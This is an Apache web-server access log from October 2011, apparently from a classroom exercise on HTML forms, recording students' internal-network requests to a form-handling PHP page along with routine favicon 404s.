10.18.44.53 - - [06/Oct/2011:12:22:48 -0500] "POST /formreturn.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:22:48 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:22:48 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:22:48 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.54 - - [06/Oct/2011:12:22:48 -0500] "POST /formreturn.php HTTP/1.1" 200 400 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.35 - - [06/Oct/2011:12:22:53 -0500] "POST /formreturn.php HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.187 Safari/535.1"
10.18.44.35 - - [06/Oct/2011:12:22:53 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.187 Safari/535.1"
10.18.44.54 - - [06/Oct/2011:12:22:57 -0500] "POST /formreturn.php HTTP/1.1" 200 427 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.47 - - [06/Oct/2011:12:22:58 -0500] "POST /formreturn.php HTTP/1.1" 200 402 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.65.1.106 - - [06/Oct/2011:12:23:00 -0500] "POST /formreturn.php HTTP/1.1" 200 414 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.106 - - [06/Oct/2011:12:23:00 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.47 - - [06/Oct/2011:12:23:01 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.42 - - [06/Oct/2011:12:23:08 -0500] "POST /formreturn/php HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.41 - - [06/Oct/2011:12:23:09 -0500] "POST /formreturn.php HTTP/1.1" 200 414 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.42 - - [06/Oct/2011:12:23:11 -0500] "GET /formreturn/php HTTP/1.1" 200 313 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.42 - - [06/Oct/2011:12:23:15 -0500] "POST /formreturn/php HTTP/1.1" 200 418 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.42 - - [06/Oct/2011:12:23:17 -0500] "POST /formreturn/php HTTP/1.1" 200 418 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
::1 - - [06/Oct/2011:12:23:18 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
10.18.44.42 - - [06/Oct/2011:12:23:20 -0500] "POST /formreturn/php HTTP/1.1" 200 418 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
::1 - - [06/Oct/2011:12:23:25 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
10.18.44.42 - - [06/Oct/2011:12:23:29 -0500] "POST /formreturn/php HTTP/1.1" 200 418 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.54 - - [06/Oct/2011:12:23:30 -0500] "POST /formreturn.php HTTP/1.1" 200 427 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.42 - - [06/Oct/2011:12:23:31 -0500] "POST /formreturn/php HTTP/1.1" 200 368 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.42 - - [06/Oct/2011:12:23:36 -0500] "POST /formreturn/php HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
::1 - - [06/Oct/2011:12:23:53 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
10.18.44.36 - - [06/Oct/2011:12:25:38 -0500] "POST /formreturn.php HTTP/1.1" 200 402 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
10.18.44.36 - - [06/Oct/2011:12:25:38 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
10.18.44.50 - - [06/Oct/2011:12:25:40 -0500] "POST /formreturn.php HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.38 - - [06/Oct/2011:12:25:41 -0500] "POST /formreturn.php HTTP/1.1" 200 369 "-" "Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0"
10.65.1.37 - - [06/Oct/2011:12:25:41 -0500] "POST /formreturn.php HTTP/1.1" 200 388 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.37 - - [06/Oct/2011:12:25:42 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.41 - - [06/Oct/2011:12:25:44 -0500] "POST /formreturn.php HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.153 - - [06/Oct/2011:12:25:45 -0500] "POST /formreturn.php HTTP/1.1" 200 382 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
10.18.44.47 - - [06/Oct/2011:12:25:46 -0500] "POST /formreturn.php HTTP/1.1" 200 389 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.47 - - [06/Oct/2011:12:25:49 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.36 - - [06/Oct/2011:12:25:52 -0500] "POST /formreturn.php HTTP/1.1" 200 388 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
10.18.44.36 - - [06/Oct/2011:12:25:52 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
10.65.1.37 - - [06/Oct/2011:12:25:54 -0500] "POST /formreturn.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.37 - - [06/Oct/2011:12:25:54 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
::1 - - [06/Oct/2011:12:26:00 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
10.18.44.34 - - [06/Oct/2011:12:26:05 -0500] "POST /formreturn.php HTTP/1.1" 200 389 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
::1 - - [06/Oct/2011:12:26:11 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [06/Oct/2011:12:26:20 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
10.18.44.53 - - [06/Oct/2011:12:26:28 -0500] "POST /formreturn.php HTTP/1.1" 200 377 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:26:28 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:26:28 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:26:28 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.51 - - [06/Oct/2011:12:26:38 -0500] "POST /formreturn.php HTTP/1.1" 200 386 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [06/Oct/2011:12:26:38 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.4.236 - - [06/Oct/2011:12:26:41 -0500] "POST /formreturn.php HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0"
10.18.44.51 - - [06/Oct/2011:12:26:47 -0500] "POST /formreturn.php HTTP/1.1" 200 414 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [06/Oct/2011:12:26:47 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.43 - - [06/Oct/2011:12:26:52 -0500] "POST /formreturn.php HTTP/1.1" 200 440 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.37 - - [06/Oct/2011:12:27:17 -0500] "POST /formreturn.php HTTP/1.1" 200 386 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.43 - - [06/Oct/2011:12:27:20 -0500] "POST /formreturn.php HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.35 - - [06/Oct/2011:12:27:25 -0500] "POST /formreturn.php HTTP/1.1" 200 426 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.187 Safari/535.1"
10.18.44.35 - - [06/Oct/2011:12:27:25 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.187 Safari/535.1"
10.18.44.42 - - [06/Oct/2011:12:27:50 -0500] "POST /formreturn/php HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.50 - - [06/Oct/2011:12:28:02 -0500] "POST /formreturn.php HTTP/1.1" 200 386 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.39 - - [06/Oct/2011:12:28:02 -0500] "POST /formreturn.php HTTP/1.1" 200 387 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.42 - - [06/Oct/2011:12:28:03 -0500] "POST /formreturn/php HTTP/1.1" 200 385 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.54 - - [06/Oct/2011:12:28:12 -0500] "POST /formreturn.php HTTP/1.1" 200 438 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.135 - - [06/Oct/2011:12:28:15 -0500] "POST /formreturn.php HTTP/1.1" 200 441 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.54 - - [06/Oct/2011:12:28:18 -0500] "POST /formreturn.php HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.135 - - [06/Oct/2011:12:28:20 -0500] "POST /formreturn.php HTTP/1.1" 200 440 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.54 - - [06/Oct/2011:12:28:22 -0500] "POST /formreturn.php HTTP/1.1" 200 436 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.50 - - [06/Oct/2011:12:28:32 -0500] "POST /formreturn.php HTTP/1.1" 200 383 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.106 - - [06/Oct/2011:12:28:40 -0500] "POST /formreturn.php HTTP/1.1" 200 387 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.106 - - [06/Oct/2011:12:28:40 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.38 - - [06/Oct/2011:12:28:45 -0500] "POST /formreturn.php HTTP/1.1" 200 361 "-" "Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0"
10.65.1.37 - - [06/Oct/2011:12:28:52 -0500] "POST /formreturn.php HTTP/1.1" 200 383 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.37 - - [06/Oct/2011:12:28:52 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.50 - - [06/Oct/2011:12:28:56 -0500] "POST /formreturn.php HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.42 - - [06/Oct/2011:12:29:09 -0500] "POST /formreturn/php HTTP/1.1" 200 383 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.53 - - [06/Oct/2011:12:29:13 -0500] "POST /formreturn.php HTTP/1.1" 200 370 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:29:13 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:29:13 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:29:13 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:29:16 -0500] "POST /formreturn.php HTTP/1.1" 200 373 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.135 - - [06/Oct/2011:12:29:19 -0500] "POST /formreturn.php HTTP/1.1" 200 438 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:29:20 -0500] "POST /formreturn.php HTTP/1.1" 200 376 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:29:24 -0500] "POST /formreturn.php HTTP/1.1" 200 374 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.51 - - [06/Oct/2011:12:29:25 -0500] "POST /formreturn.php HTTP/1.1" 200 384 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.18.44.51 - - [06/Oct/2011:12:29:25 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.135 - - [06/Oct/2011:12:29:32 -0500] "POST /formreturn.php HTTP/1.1" 200 403 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.139 - - [06/Oct/2011:12:29:38 -0500] "POST /formreturn.php HTTP/1.1" 200 383 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; InfoPath.2; Tablet PC 2.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)"
10.18.44.44 - - [06/Oct/2011:12:29:40 -0500] "POST /formreturn.php HTTP/1.1" 200 428 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
10.18.44.47 - - [06/Oct/2011:12:29:45 -0500] "POST /formreturn.php HTTP/1.1" 200 384 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.42 - - [06/Oct/2011:12:29:47 -0500] "POST /formreturn/php HTTP/1.1" 200 383 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.41 - - [06/Oct/2011:12:29:53 -0500] "POST /formreturn.php HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.42 - - [06/Oct/2011:12:29:53 -0500] "POST /formreturn/php HTTP/1.1" 200 382 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.65.1.106 - - [06/Oct/2011:12:29:55 -0500] "POST /formreturn.php HTTP/1.1" 200 380 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.106 - - [06/Oct/2011:12:29:55 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1"
10.65.1.135 - - [06/Oct/2011:12:29:59 -0500] "POST /formreturn.php HTTP/1.1" 200 404 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.38 - - [06/Oct/2011:12:32:31 -0500] "POST /formreturn.php HTTP/1.1" 200 380 "-" "Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0"
10.65.1.153 - - [06/Oct/2011:12:32:37 -0500] "POST /formreturn.php HTTP/1.1" 200 403 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
10.18.44.44 - - [06/Oct/2011:12:34:31 -0500] "POST /formreturn.php HTTP/1.1" 200 416 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
10.18.44.50 - - [06/Oct/2011:12:34:52 -0500] "POST /formreturn.php HTTP/1.1" 200 465 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.135 - - [06/Oct/2011:12:34:54 -0500] "POST /formreturn.php HTTP/1.1" 200 420 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.153 - - [06/Oct/2011:12:34:55 -0500] "POST /formreturn.php HTTP/1.1" 200 403 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
10.18.44.38 - - [06/Oct/2011:12:34:56 -0500] "POST /formreturn.php HTTP/1.1" 200 402 "-" "Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0"
10.18.44.47 - - [06/Oct/2011:12:34:58 -0500] "POST /formreturn.php HTTP/1.1" 200 468 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.65.1.135 - - [06/Oct/2011:12:35:00 -0500] "POST /formreturn.php HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.47 - - [06/Oct/2011:12:35:01 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.34 - - [06/Oct/2011:12:35:07 -0500] "POST /formreturn.php HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.41 - - [06/Oct/2011:12:35:17 -0500] "POST /formreturn.php HTTP/1.1" 200 481 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.42 - - [06/Oct/2011:12:35:31 -0500] "POST /formreturn/php HTTP/1.1" 200 461 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.36 - - [06/Oct/2011:12:35:36 -0500] "POST /formreturn.php HTTP/1.1" 200 400 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
10.18.44.36 - - [06/Oct/2011:12:35:36 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
10.18.44.47 - - [06/Oct/2011:12:35:38 -0500] "POST /formreturn.php HTTP/1.1" 200 427 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.44 - - [06/Oct/2011:12:35:40 -0500] "POST /formreturn.php HTTP/1.1" 200 416 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
10.18.44.47 - - [06/Oct/2011:12:35:40 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22"
10.18.44.53 - - [06/Oct/2011:12:35:43 -0500] "POST /formreturn.php HTTP/1.1" 200 404 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.46 - - [06/Oct/2011:12:35:44 -0500] "POST /formreturn.php HTTP/1.1" 200 400 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.14pre) Gecko/20110126 Komodo/6.1.2"
10.18.44.48 - - [06/Oct/2011:12:35:44 -0500] "GET /formreturn.php?first_name=enter+first+name&last_name=enter+last+name&thedoctor=Rose&time_delorean=delorean&admirals=&comments=Please+say+nice+things HTTP/1.1" 200 428 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
10.18.44.39 - - [06/Oct/2011:12:35:58 -0500] "POST /formreturn.php HTTP/1.1" 200 460 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.53 - - [06/Oct/2011:12:36:01 -0500] "POST /formreturn.php HTTP/1.1" 200 431 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.43 - - [06/Oct/2011:12:36:06 -0500] "POST /formreturn.php HTTP/1.1" 200 435 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.36 - - [06/Oct/2011:12:36:19 -0500] "POST /formreturn.php HTTP/1.1" 200 397 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
10.18.44.36 - - [06/Oct/2011:12:36:19 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.81 Safari/535.2"
::1 - - [06/Oct/2011:12:36:37 -0500] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
10.65.1.139 - - [06/Oct/2011:12:39:12 -0500] "POST /formreturn.php HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.253 - - [06/Oct/2011:12:46:45 -0500] "POST /formreturn.php HTTP/1.1" 200 448 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.253 - - [06/Oct/2011:12:46:45 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.253 - - [06/Oct/2011:12:46:45 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.253 - - [06/Oct/2011:12:46:45 -0500] "GET /favicon.ico HTTP/1.1" 404 507 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.65.1.253 - - [06/Oct/2011:12:47:10 -0500] "POST /formreturn.php HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.54 - - [07/Oct/2011:08:41:23 -0500] "POST /formreturn.php HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
10.18.44.50 - - [07/Oct/2011:08:45:15 -0500] "POST /formreturn.php HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
